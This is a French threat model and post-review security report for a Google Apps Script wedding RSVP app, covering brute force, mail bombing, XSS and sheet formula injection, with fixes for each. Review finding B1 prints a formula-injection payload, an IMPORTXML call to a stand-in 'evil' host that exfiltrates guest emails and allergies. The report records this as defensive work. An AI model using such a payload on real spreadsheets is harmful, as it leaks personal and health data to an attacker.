# SECURITE — modèle de menaces et parades

État au 2026-10-18, fin de Phase 2 (backend), **après revue indépendante**.

> Une revue de sécurité menée par un relecteur qui n'avait pas écrit le code a trouvé
> **4 points bloquants et 7 points à corriger**, tous réels, tous corrigés depuis. Le détail
> figure en §7. Deux lignes de ce document étaient fausses avant cette revue : M10 affirmait
> que « toute saisie libre » était assainie, alors que le chemin du `Journal` ne l'était pas,
> et M5 justifiait le plafond anti-sondage par un raisonnement inexact.

Légende : ✅ implémentée et testée · 🔶 implémentée, test en attente d'un environnement réel · ⏳ phase ultérieure.

## 1. Ce que l'on protège

| Bien | Pourquoi il compte |
|---|---|
| Les réponses d'un foyer (présences, **allergies**, **régimes**, âge des enfants) | Données personnelles, dont des **données de santé** (C14, RGPD) |
| La liste des invités et leurs adresses | Données personnelles, révèle aussi la composition du cercle privé des mariés |
| La capacité d'envoi de mail du compte Google de Harry | Ressource rare (~100/jour, C8) ; épuisée, plus personne ne peut se connecter |
| L'intégrité du Sheet | C'est la seule base ; une corruption se paie en coups de téléphone aux invités |

## 2. Ce contre quoi on ne protège pas

Dit explicitement, pour que personne ne s'illusionne :

- **Un invité légitime qui ment** (déclare 3 présents puis vient à 5). Hors périmètre.
- **Un invité qui transfère son mail de code** à un tiers. Le code vaut porte d'entrée, comme un carton d'invitation.
- **Google**. Toutes les données sont chez Google, par construction.
- **Une attaque ciblée par un adversaire déterminé** disposant déjà de la liste des adresses d'invités.
- **Le déni de service distribué**. Apps Script ne voit pas l'adresse IP (C6) ; on ne peut limiter que par email, par code et par quota global. Un attaquant qui connaît beaucoup d'adresses d'invités peut épuiser le quota du jour. Parade : le plafond protège le compte, et `Journal` trace l'incident pour réagir.

## 3. Modèle de menaces

| # | Menace | Parade | Où | État |
|---|---|---|---|---|
| M1 | **Force brute sur le code** à 6 chiffres | Code aléatoire issu d'un UUID v4 (D19), TTL 10 min, **5 essais maximum par code** décomptés **sous verrou**, code effacé dès qu'il est accepté ou épuisé | `Securite.gs` · `consommerCode_` | ✅ |
| M2 | **Mail bombing** d'une adresse d'invité | 5 demandes maximum par adresse et par heure, compteur **persistant** (C7), fenêtre glissante, lecture-écriture **sous verrou** pour résister aux requêtes concurrentes | `Securite.gs` · `demandeAutorisee_` | ✅ |
| M3 | **Épuisement du quota mail global** | Créneau d'envoi **réservé sous verrou avant** l'envoi (et rendu si l'envoi échoue), plafond applicatif `PLAFOND_MAILS_JOUR` **et** contrôle de `getRemainingDailyQuota()` ; au-delà, `SERVICE_INDISPONIBLE` et alerte dans `Journal` | `Securite.gs` · `reserverEnvoiMail_` | ✅ |
| M4 | **Robots sur le formulaire email** | Champ caché « honeypot » : s'il est rempli, la réponse est indiscernable d'un succès et **aucun mail ne part** | `Code.gs` · `actionRequestCode_` | ✅ |
| M5 | **Énumération des invités** | Message explicite `EMAIL_INCONNU` assumé (D04). Plafond **global** de 50 sondages d'adresses inconnues par heure, porté par **une seule clé** et placé sur la seule branche « adresse inconnue » — il ne peut donc jamais bloquer un invité légitime | `Code.gs` · `actionRequestCode_` | ✅ |
| M6 | **Vol ou rejeu de session** | Token = UUID v4, TTL 6 h, stocké **haché** côté serveur (D18), en `sessionStorage` côté client, invalidé au logout. Donne accès au seul foyer associé | `Securite.gs` · `ouvrirSession_` | ✅ |
| M7 | **Accès aux données d'un autre foyer** | `foyerDeSession_(token)` est la **seule** source d'un `foyer_id`. Aucune action ne lit un identifiant venu du client — vérifié par test en injectant `foyer_id`, `foyerId` et `foyer` dans la requête | `Code.gs`, `Securite.gs` | ✅ |
| M8 | **Le client réécrit des données du Sheet** (renomme un invité, se déclare enfant, se déclare accompagnant) | Les noms sont rapprochés de l'onglet `Invites` et **réécrits depuis le Sheet** ; `type_personne` et `est_accompagnant` sont imposés par le serveur | `Code.gs` · `actionSubmitRsvp_` | ✅ |
| M9 | **XSS** (noms venant du Sheet, saisies d'invités) | Front : `textContent` uniquement, jamais `innerHTML` avec des données. Mail HTML : `echapperHtml_` sur toute valeur insérée. CSP par balise `<meta>` | `Mail.gs` · `echapperHtml_` ; front | ✅ mail · ⏳ front (P3) |
| M10 | **Injection de formules dans le Sheet** | `assainirTexte_` sur **les trois seuls points d'écriture** de données venant du client : `Reponses`, `Historique` et **`Journal`** (ce dernier était le trou, voir §7 B1). Retrait des caractères de contrôle, troncature, apostrophe devant `=` `+` `-` `@`, y compris masqués par des espaces. Colonnes du `Journal` forcées en format texte en défense en profondeur | `Securite.gs`, `Sheet.gs` · `journaliser_` | ✅ |
| M11 | **Écritures concurrentes / doublons** | `LockService` sur toute écriture, réécriture complète et idempotente des lignes du foyer, `Historique` en ajout seul | `Sheet.gs` · `ecrireReponsesFoyer_` | ✅ |
| M12 | **Fuite de données par le dépôt public** | `.gitignore` strict, aucune adresse réelle (tout est en `@example.com`), adresse de test dans la Script Property `EMAIL_TEST`, historique git vérifié | dépôt | ✅ |
| M13 | **Partage accidentel du Sheet** | Jamais de partage par lien ; accès nominatif aux mariés. Rappelé dans `INSTALLATION.md` et à venir dans `GUIDE_MARIES.md` | procédure | 🔶 |
| M14 | **Journal trop bavard** | Aucun code, token, régime, allergie ni commentaire dans `Journal` — vérifié par test | `Sheet.gs` · `journaliser_` | ✅ |
| M15 | **Fuite technique dans une réponse d'erreur** | Toute exception inattendue devient `ERREUR_SERVEUR` ; la trace reste dans le journal d'exécution Google. Vérifié en cassant volontairement le classeur | `Code.gs` · `doPost` | ✅ |
| M16 | **Requête malformée ou volumineuse** | Corps plafonné à 20 000 caractères, JSON validé, action cherchée avec `hasOwnProperty` (une action nommée `constructor` ou `__proto__` n'est pas routable) | `Code.gs` · `doPost` | ✅ |
| M17 | **Dépassement de `places_max`** | Nombre de présents et nombre d'accompagnants contrôlés côté serveur, pas seulement dans l'interface | `Code.gs` · `actionSubmitRsvp_` | ✅ |
| M18 | **Réponses après la date limite** | `DATE_LIMITE` lue dans `Config` à chaque soumission ; la consultation reste possible, l'écriture non | `Code.gs` · `reponsesOuvertes_` | ✅ |
| M19 | **Saturation des magasins persistants** | Aucune clé de `PropertiesService` n'est créée pour une adresse inconnue ; balayage en une seule écriture au lieu de N suppressions ; échec propre en `SERVICE_INDISPONIBLE` si le magasin sature. `Historique` et `Reponses` agrandissent la feuille avant d'écrire, et `verifierDonnees()` alerte à 80 % de remplissage | `Securite.gs`, `Sheet.gs` | ✅ |
| M20 | **Journal alimentable sans limite** | Les requêtes rejetées sur la **forme** (adresse ou code mal formés) n'écrivent aucune ligne ; seules les adresses bien formées laissent une trace | `Code.gs` | ✅ |

## 4. Décisions de sécurité et risques acceptés

| # | Décision | Risque accepté |
|---|---|---|
| D04 | Message `EMAIL_INCONNU` explicite plutôt qu'une réponse uniforme | Un attaquant qui possède déjà une adresse peut confirmer qu'elle est invitée. Jugé faible devant le coût en expérience utilisateur. |
| D08 | Plusieurs adresses par foyer | Le plafond horaire est **par adresse** : un foyer à 3 adresses peut recevoir 3 × 5 codes par heure. Le plafond journalier global reste la vraie protection. |
| D14 | Adresse git personnelle publique | Collecte automatisée de l'adresse de Harry sur GitHub. Sans effet sur les données des invités. |
| D15 | Portée OAuth `spreadsheets` au lieu de `spreadsheets.currentonly` | Le script peut techniquement accéder aux autres classeurs du compte. Il n'en ouvre qu'un seul, et il appartient à Harry. |
| — | Codes à 6 chiffres | 1 chance sur 200 000 de deviner en 5 essais, sur une fenêtre de 10 minutes. Suffisant pour l'enjeu. |
| — | `CODE_EXPIRE` et `CODE_INVALIDE` distinguables | Révèle qu'une demande de code est en cours pour une adresse donnée. Cohérent avec D04, impact négligeable. |
| — | Plafond de sondage de 50 adresses inconnues par heure | Un robot peut provoquer 50 lectures du Sheet par heure. Borné, sans effet sur les invités, et aucune donnée n'est exposée. |

## 5. Ce qui reste à vérifier dans un environnement réel

Ces points ne peuvent pas être prouvés hors de Google :

- [ ] Concurrence réelle : deux onglets qui soumettent simultanément (le `LockService` simulé répond toujours oui).
- [ ] Délivrabilité des mails : Gmail, Outlook, iCloud, et absence de classement en spam (C15, R01).
- [ ] Comportement sous démarrage à froid de 1 à 4 s (C5).
- [ ] Taille réelle de `PropertiesService` après plusieurs centaines de demandes.
- [ ] CSP du front sans violation en usage normal (P3).

## 6. Gate SEC

| Point de la gate (§3.2 du brief) | État |
|---|---|
| Chaque menace a une parade implémentée **et testée** | ✅ pour le backend · ⏳ M9 côté front (P3) |
| Aucune donnée personnelle ni adresse réelle dans le dépôt (`git log -p` vérifié) | ✅ |
| Aucune action ne fait confiance à un identifiant fourni par le client | ✅ |
| La CSP est en place et ne casse pas le site | ⏳ P3 |
| Les erreurs renvoyées ne contiennent ni trace technique ni contenu interne | ✅ |


## 7. Revue indépendante du 2026-10-18 — défauts trouvés et corrigés

Revue menée par un relecteur qui n'avait pas écrit le code, sur la base du §3.2 du brief.
Les 122 tests existants n'en couvraient aucun : ils validaient le comportement prévu, pas
les chemins oubliés. **36 tests de régression** ont été ajoutés, un par défaut.

### Bloquants

| # | Défaut | Pourquoi c'était grave | Correction |
|---|---|---|---|
| **B1** | `journaliser_` écrivait l'adresse reçue **sans assainissement**, et la colonne `email` du `Journal` n'était pas en format texte | Un `curl` **anonyme** avec `{"email":"=IMPORTXML(\"https://evil/?d=\"&JOIN(\",\",Foyers!B2:B200),\"//a\")"}` posait une vraie formule, évaluée avec les droits du propriétaire, exfiltrant les adresses des invités et les allergies. Aucun code ni token requis | Les quatre valeurs passent par `assainirTexte_` ; `email`, `action` et `resultat` ajoutées aux colonnes en format texte |
| **B2** | Les compteurs anti-abus et le quota mail faisaient lire-modifier-écrire **sans verrou** | Apps Script autorise ~30 exécutions simultanées : 30 `requestCode` parallèles lisaient toutes « 0 demande » et partaient toutes. 30 mails, compteur à 1. Mail bombing effectif et quota du jour épuisé en minutes | `avecVerrou_` sur les compteurs ; le créneau d'envoi est **réservé avant** l'envoi et rendu si l'envoi échoue |
| **B3** | Chaque adresse inventée créait une clé persistante | ~10 000 requêtes saturaient `PropertiesService` (500 Ko). Au-delà, `setProperty` levait et **plus aucun invité ne pouvait se connecter** — état persistant, réparable seulement à la main | Aucune clé par adresse inconnue : un **unique** compteur global horaire, placé sur la seule branche « inconnue ». Balayage en une écriture. Saturation convertie en `SERVICE_INDISPONIBLE` |
| **B4** | `getRange(...).setValues()` n'agrandit pas la feuille, contrairement à `appendRow` | `Historique` est en ajout seul : à la 1 000ᵉ ligne — atteinte avant la date limite — chaque soumission écrivait `Reponses` puis **échouait** sur l'archivage. Réponse enregistrée, aucun récapitulatif, écriture non atomique | `assurerLignes_()` avant chaque écriture, dans `Reponses` et `Historique` |

### À corriger

| # | Défaut | Correction |
|---|---|---|
| **A1** | Les clés d'appariement des noms étaient calculées différemment côté `Invites` (nom brut) et côté client (nom assaini) : une **espace insécable** ou un double espace dans le Sheet rendait le foyer **définitivement incapable de répondre** | Fonction `cleNom_()` unique, appliquée des deux côtés ; `verifierDonnees()` signale désormais ces noms en **erreur** |
| **A2** | `parNom` était un objet littéral : une personne nommée `constructor` échappait au plafond d'accompagnants et écrivait une ligne vide | `Object.create(null)`, et `hasOwnProperty` pour la construction des lignes |
| **A3** | `presence` : toute valeur non reconnue (`"1"`, `"yes"`, `"oui "`) basculait **silencieusement en absent** | Liste blanche stricte, `DONNEES_INVALIDES` sinon |
| **A4** | Le compteur d'essais d'un code n'était pas atomique | `consommerCode_` sous verrou |
| **A5** | `lireOnglet_` ignore les lignes vides, mais l'effacement portait sur ce nombre : une ligne vidée à la main par les mariés laissait une **ligne orpheline en double** après la soumission suivante | Effacement d'après `getLastRow()` réel |
| **A6** | Toute requête malformée écrivait une ligne de `Journal`, sans limite | Les rejets sur la forme n'écrivent plus rien. `verifyCode` contrôle aussi le format de l'adresse — trou supplémentaire trouvé en écrivant le test de régression |
| **A7** | Remplir `EXPEDITEUR_ADRESSE` dans `Config` aurait fait échouer **chaque connexion** en `ERREUR_SERVEUR`, la portée `gmail.send` n'étant pas déclarée | Repli sur `MailApp` avec alerte au `Journal` ; `verifierDonnees()` le signale en erreur |

### Régression introduite pendant la correction, puis corrigée

La première version du correctif B3 plaçait le plafond de sondage **avant** la recherche du
foyer. Le test de régression a immédiatement montré que 50 sondages bloquaient alors aussi
les invités légitimes pendant une heure — un déni de service, précisément ce que B3 cherchait
à éviter. Le contrôle a été déplacé sur la seule branche « adresse inconnue ».

### Non retenu

- **Suggestion U+200B et caractères invisibles hors `\s`** : vérifié, ce n'est pas un
  contournement de la neutralisation de formules. Traité en amont : `verifierDonnees()`
  signale ces caractères dans les noms de `Invites`, là où ils font des dégâts.
- **Décalage minuit Paris / Pacifique** entre le compteur applicatif et le quota Gmail :
  réel mais rattrapé par `getRemainingDailyQuota()`. Noté, pas corrigé.
